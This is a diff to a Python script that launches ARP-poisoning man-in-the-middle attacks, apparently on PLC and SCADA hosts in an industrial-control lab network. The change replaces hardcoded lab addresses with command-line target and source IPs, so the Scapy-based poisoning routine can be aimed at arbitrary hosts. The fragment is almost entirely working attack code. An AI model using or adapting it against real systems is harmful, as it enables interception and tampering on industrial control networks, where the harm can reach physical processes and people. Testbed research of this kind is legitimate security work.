@@ -117,16 +117,10 @@ def __setdown(port):
     conn.commit()
 
 def launch_arp_poison():
-    print("[*] Launching arp poison on " + PLC_IPS[sys.argv[1]])
+    print("[*] Launching arp poison on " + sys.argv[2])
 
-    if sys.argv[1] == 'scada':
-        # SCADA Mitm attack
-        targetip = "192.168.2.30"
-        sourceip = "192.168.2.254"
-    else:
-        # PLC2 MiTm attack
-        targetip = PLC_IPS[sys.argv[1]]
-        sourceip = PLC_IPS['plc9']
+    targetip = sys.argv[2]
+    sourceip = sys.argv[1]
 
     arppacket = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=targetip)
     targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
